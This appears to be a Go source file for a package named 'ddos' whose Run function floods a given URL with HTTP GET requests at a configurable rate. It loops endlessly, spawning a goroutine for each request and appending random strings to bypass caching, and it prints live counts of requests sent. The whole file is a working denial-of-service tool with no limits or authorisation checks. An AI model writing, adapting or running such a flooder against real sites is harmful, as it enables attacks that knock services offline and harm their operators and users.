package ddos

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
	random "dgo/randomString"
)

var count int64
var count_rx int64

// The DPS string should be in the format "requests/unit", e.g., "10/S" or "100/MS".
func Run(url string, dps string) error {
	if url == "" || dps == "" {
		return fmt.Errorf("invalid arguments - missing URL or DPS")
	}

	parts := strings.Split(dps, "/")
	if len(parts) != 2 {
		return fmt.Errorf("invalid DPS format; expected <requests>/<unit>")
	}

	requests, err := strconv.Atoi(parts[0])
	if err != nil {
		return fmt.Errorf("invalid number of requests in DPS: %w", err)
	}

	unit := strings.ToUpper(parts[1])
	var delay time.Duration
	switch unit {
	case "S":
		delay = time.Second / time.Duration(requests)
	case "MS":
		delay = time.Millisecond / time.Duration(requests)
	default:
		return fmt.Errorf("invalid time unit in DPS; use S or MS")
	}

	for {
		go func() {
			str := random.Create(10, "default")
			startTime := time.Now()
			resp, err := http.Get(url+str)
			if err != nil {
				log.Printf("\rRequest error: %v", err)
				return
			}
			resp.Body.Close()
			atomic.AddInt64(&count, 1)
			atomic.AddInt64(&count_rx, 1)
			deltaTime := time.Since(startTime)
			fmt.Printf("\r\033[KRequest succeeded. | TX: %-5d | RX: %-5d | Time taken: %-15s | Tryied: %-5s", count, count_rx, deltaTime, str)

		}()
		time.Sleep(delay)
	}
}